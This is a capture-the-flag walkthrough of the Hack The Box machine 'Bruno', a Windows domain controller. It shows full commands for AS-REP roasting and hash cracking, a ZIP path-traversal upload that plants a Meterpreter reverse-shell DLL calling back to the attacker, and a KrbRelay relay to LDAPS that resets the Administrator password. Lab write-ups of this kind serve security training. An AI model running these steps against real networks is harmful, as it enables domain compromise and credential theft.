# Hack The Box: Bruno

| Field | Value |
| --- | --- |
| Machine | Bruno (Windows Active Directory, Medium) |
| Date | 27 September 2026 |
| Target for this session | `10.129.238.9` |
| Domain controller | `brunodc.bruno.vl` |
| Initial access | Anonymous FTP disclosure, `svc_scan` AS-REP roasting, SMB ZIP upload, and scanner DLL loading |
| Privilege escalation | Machine account creation and local Kerberos relay of `BRUNODC$` to LDAPS |

The target IP and the local relay port belong to this lab session and may change after a reset. Flag contents and plaintext passwords are omitted. The recorded output confirms the `svc_scan` foothold and two successful LDAP modifications; the final Administrator login commands appear at the end for verification.

## Reconnaissance

After a TCP port sweep, I ran service detection and default scripts against the identified ports:

```bash
nmap -sC -sV \
  -p21,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389 \
  -oN bruno-services.nmap 10.129.238.9
```

The services included FTP on 21, IIS on 80 and 443, Kerberos on 88, LDAP on 389 and 636, SMB on 445, and RDP on 3389. LDAP identified the `bruno.vl` domain. The LDAP and RDP certificates identified the controller as `brunodc.bruno.vl`; SMB required signing. The HTTPS certificate also carried a CA name, a clue that certificate services were present.

```bash
echo '10.129.238.9 bruno.vl brunodc.bruno.vl' >> /etc/hosts

curl -i http://10.129.238.9/
curl -ki https://10.129.238.9/
```

Both web endpoints returned the default IIS page. FTP produced the useful lead: the Nmap `ftp-anon` script reported anonymous access and four directories, `app`, `benign`, `malicious`, and `queue`.

## Anonymous FTP and scanner analysis

I logged in as `anonymous` and listed the files under `app`, saving the downloaded application files in `ftp-app`:

```bash
mkdir -p ftp-app
cd ftp-app
ftp 10.129.238.9
```

```text
Name: anonymous
Password: <any email address>
ftp> dir
ftp> cd app
ftp> dir
ftp> get changelog
ftp> get SampleScanner.dll
ftp> quit
```

```bash
cd ..
```

The directory contained a .NET application (`SampleScanner.dll` and `SampleScanner.exe`), its runtime configuration, and a changelog. The changelog named `svc_scan` as the automation account. I decompiled the DLL to understand what the scanner did with files in the queue:

```bash
file ftp-app/*
cat ftp-app/changelog ftp-app/*.json

TERM=linux dotnet tool install --global ilspycmd --version 8.2.0.7535
TERM=linux /root/.dotnet/tools/ilspycmd ftp-app/SampleScanner.dll > SampleScanner.cs
rg -n -i 'queue|benign|malicious|zip|svc_scan' SampleScanner.cs
```

The relevant part of the decompiled `Main` method was:

```csharp
string[] files = Directory.GetFiles("C:\\samples\\queue\\", "*", SearchOption.AllDirectories);

foreach (string text2 in files)
{
    if (text2.EndsWith(".zip"))
    {
        using ZipArchive zipArchive = ZipFile.OpenRead(text2);
        foreach (ZipArchiveEntry entry in zipArchive.Entries)
        {
            string destinationFileName = Path.Combine("C:\\samples\\queue\\", entry.FullName);
            entry.ExtractToFile(destinationFileName);
        }
        File.Delete(text2);
    }
    // Other files are copied into benign or malicious directories.
}
```

`entry.FullName` comes from the ZIP archive. On Windows, a rooted entry name such as `C:\samples\app\file.txt` replaces the `C:\samples\queue\` base when passed to `Path.Combine`. The scanner then extracts to that resulting path. This gave me a candidate file-placement primitive, provided I could write a ZIP into the queue.

## AS-REP roasting `svc_scan` and finding queue access

Because the changelog exposed an account name and the host was a domain controller, I checked that principal over Kerberos:

```bash
printf '%s\n' svc_scan xct > candidates.txt
kerbrute userenum --dc 10.129.238.9 -d bruno.vl candidates.txt

impacket-GetNPUsers 'bruno.vl/svc_scan' -dc-ip 10.129.238.9 -no-pass
```

`svc_scan` was valid and did not require Kerberos preauthentication. `GetNPUsers` returned a `$krb5asrep$23$` hash, which could be cracked offline with Hashcat mode `18200`. For a repeatable cracking step, save the same request to a file:

```bash
impacket-GetNPUsers 'bruno.vl/svc_scan' -dc-ip 10.129.238.9 \
  -no-pass -outputfile svc_scan.asrep
hashcat -m 18200 svc_scan.asrep /usr/share/wordlists/rockyou.txt
hashcat -m 18200 svc_scan.asrep --show
```

The recovered password authenticated over SMB. Share enumeration exposed the writable location needed for the scanner path:

```bash
nxc smb 10.129.238.9 -d bruno.vl \
  -u svc_scan -p '<svc_scan_password>' --shares
```

```text
Share       Permissions
----------  -----------
CertEnroll  READ
NETLOGON    READ
queue       READ,WRITE
SYSVOL      READ
```

The `CertEnroll` share also supported the earlier certificate-service clue. Anonymous FTP could read the queue but could not upload to it; the authenticated SMB `queue` share supplied the write access.

## Proving ZIP extraction outside the queue

I created a small ZIP whose member had a rooted Windows path into the scanner's `app` directory:

```bash
python3 - <<'PY'
from zipfile import ZipFile, ZIP_DEFLATED

with ZipFile('path-test.zip', 'w', ZIP_DEFLATED) as z:
    z.writestr(r'C:\samples\app\bruno-proof.txt', 'path test succeeded\n')
PY

unzip -l path-test.zip
```

I uploaded it to the SMB queue with the `svc_scan` credential:

```text
smbclient //10.129.238.9/queue -W BRUNO -U svc_scan
Password: <svc_scan_password>
smb: \> put path-test.zip
smb: \> quit
```

Listing the FTP `app` directory then showed `bruno-proof.txt`:

```bash
curl -s --list-only -u 'anonymous:anonymous@' ftp://10.129.238.9/app/
```

This observation confirmed the ZIP member had been extracted into `C:\samples\app`, outside the queue. Before sending another ZIP, I removed the earlier test archive from the share; a repeated extraction to the existing proof file could stop the scanner's processing loop:

```text
smbclient //10.129.238.9/queue -W BRUNO -U svc_scan
Password: <svc_scan_password>
smb: \> del path-test.zip
smb: \> quit
```

## DLL placement and `svc_scan` foothold

The scanner's next tested load target was the native DLL name `Microsoft.DiaSymReader.Native.amd64.dll` in its application directory. The ZIP write test showed that I could place a file at that path. I generated a Windows x64 Meterpreter DLL, then packaged it with that exact path as the ZIP member name:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<tun0_ip> LPORT=4444 -f dll \
  -o Microsoft.DiaSymReader.Native.amd64.dll

python3 - <<'PY'
from zipfile import ZipFile, ZIP_DEFLATED

dll = 'Microsoft.DiaSymReader.Native.amd64.dll'
with ZipFile('scanner-dll.zip', 'w', ZIP_DEFLATED) as z:
    z.write(dll, arcname='C:\\samples\\app\\' + dll)
PY

unzip -l scanner-dll.zip
```

The matching listener was configured in Metasploit:

```text
msfconsole -q
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST <tun0_ip>
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > run
```

In another Kali terminal, I uploaded the ZIP through SMB:

```text
smbclient //10.129.238.9/queue -W BRUNO -U svc_scan
Password: <svc_scan_password>
smb: \> put scanner-dll.zip
smb: \> quit
```

The scanner extracted the DLL to `app`, loaded it, and the handler received a session. Meterpreter identified the account and host:

```text
meterpreter > getuid
Server username: BRUNO\svc_scan

meterpreter > sysinfo
Computer     : BRUNODC
OS           : Windows Server 2022
Architecture : x64

meterpreter > shell
```

From the Windows shell, I checked the token and located the user flag:

```cmd
whoami /all
dir "%USERPROFILE%\Desktop"
type C:\Users\svc_scan\Desktop\user.txt
```

## Creating a controlled computer account

`whoami /all` displayed `SeMachineAccountPrivilege` as disabled in this process. I checked the domain's machine account quota and found it was `10`:

```bash
nxc ldap 10.129.238.9 -d bruno.vl \
  -u svc_scan -p '<svc_scan_password>' -M maq
```

I used authenticated LDAPS to create a computer account whose password I controlled. The `impacket-addcomputer` command prompted for `svc_scan`'s password:

```bash
impacket-addcomputer 'bruno.vl/svc_scan' -dc-ip 10.129.238.9 \
  -method LDAPS -computer-name 'ERIKLAB26$' \
  -computer-pass '<machine_password>'

nxc ldap 10.129.238.9 -d bruno.vl \
  -u 'ERIKLAB26$' -p '<machine_password>'
```

Both creation and authentication succeeded. From the `svc_scan` PowerShell foothold, I inspected the new computer object:

```powershell
$r = ([adsisearcher]'(&(objectCategory=computer)(sAMAccountName=ERIKLAB26$))').FindOne()
$r.Properties.distinguishedname
$r.Properties.serviceprincipalname
[System.Security.Principal.SecurityIdentifier]::new($r.Properties.objectsid[0], 0).Value
```

It was under `CN=Computers,DC=bruno,DC=vl`, had `HOST` and `RestrictedKrbHost` SPNs, and had SID `S-1-5-21-1536375944-4286418366-3447278137-5101` in this session. The SPNs established a Kerberos service identity I controlled; the SID identified that computer for the later RBCD change. Creating the account alone did not grant it administrative rights over the domain controller.

## Finding a local Kerberos relay route

KrbRelay needed a local TCP port accessible to the SYSTEM service used to trigger the COM authentication. I checked unused listeners and the Windows firewall's allowed ports from the target PowerShell session:

```powershell
$fw = New-Object -ComObject HNetCfg.FwMgr
$used = @([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpListeners() | ForEach-Object Port)
foreach ($name in 'SYSTEM','ANY') {
    for ($port = 10; $port -lt 65535; $port++) {
        if ($used -contains $port) { continue }
        $allowed = $null
        if (-not $fw.LocalPolicy.CurrentProfile.FirewallEnabled) { $allowed = $true }
        else { $null = $fw.IsPortAllowed($name, 2, $port, '', 6, [ref]$allowed, $null) }
        if ($allowed) { "$name allowed on TCP port $port"; break }
    }
    if ($allowed) { break }
}
```

The result was `SYSTEM allowed on TCP port 10246`. This is a **local COM/OXID resolver port**, not a port discovered by scanning the controller from Kali.

The earlier CA certificate and `CertEnroll` share suggested checking certificate-service COM registrations. On BRUNODC, the registry associated the following AppID with `CertSvc`:

```powershell
Get-ItemProperty 'Registry::HKEY_CLASSES_ROOT\AppID\*' -ErrorAction SilentlyContinue |
    Where-Object { $_.LocalService -eq 'CertSvc' } |
    Select-Object PSChildName,LocalService

Get-ItemProperty 'Registry::HKEY_CLASSES_ROOT\CLSID\{D99E6E74-FC88-11D0-B498-00A0C90312F3}' |
    Select-Object PSChildName,AppID

sc.exe qc CertSvc
```

The CLSID was registered with the same AppID, and `sc.exe` showed `SERVICE_START_NAME : localSystem`. This established an installed COM candidate running through a privileged service. The following relay test established whether that candidate actually worked.

## Relaying the domain controller to LDAPS

I downloaded a .NET Framework build of KrbRelay to Kali and uploaded it to the `svc_scan` desktop through the established Meterpreter session:

```bash
curl -fL --retry 3 -o KrbRelay.exe \
  'https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/KrbRelay.exe'
file KrbRelay.exe
```

```text
meterpreter > cd C:/Users/svc_scan/Desktop
meterpreter > upload /home/zendeni/htb_labs/bruno/KrbRelay.exe
```

The initial KrbRelay run contained no LDAP write option. It was a test of the COM trigger and LDAP bind:

```powershell
Set-Location $env:USERPROFILE\Desktop
.\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -ssl -port 10246
```

```text
[*] Relaying context: bruno.vl\BRUNODC$
[*] Forcing SYSTEM authentication
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
```

The relay authenticated as the controller's computer account over LDAPS. I then repeated the relay with two directory changes: reset the Administrator password and set resource-based constrained delegation on the controller for `ERIKLAB26$`:

```powershell
.\KrbRelay.exe -spn ldap/brunodc.bruno.vl `
  -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 `
  -ssl -port 10246 `
  -rbcd S-1-5-21-1536375944-4286418366-3447278137-5101 `
  -reset-password administrator '<new_admin_password>'
```

The tool reported `[+] LDAP session established` followed by **two** `ldap_modify: LDAP_SUCCESS` results. KrbRelay performs the password reset first and the RBCD modification second; each successful modification is a separate LDAP write. The direct Administrator login below uses the reset password.

## Administrator access and root flag

From Kali, verify the new Administrator credential over the already-open SMB service, then request a remote service shell:

```bash
nxc smb 10.129.238.9 -d bruno.vl \
  -u Administrator -p '<new_admin_password>'

impacket-psexec \
  'bruno.vl/Administrator:<new_admin_password>@10.129.238.9'
```

PsExec authenticates with the Administrator credential and starts a service-backed shell, which can report `NT AUTHORITY\SYSTEM`. The flag location and identity check are:

```cmd
whoami
type C:\Users\Administrator\Desktop\root.txt
```

The available terminal record ends with the two successful LDAP modifications; no Administrator login or root flag output was captured in it. WinRM port `5985` was absent from the observed scan, so SMB is the verification route shown here.
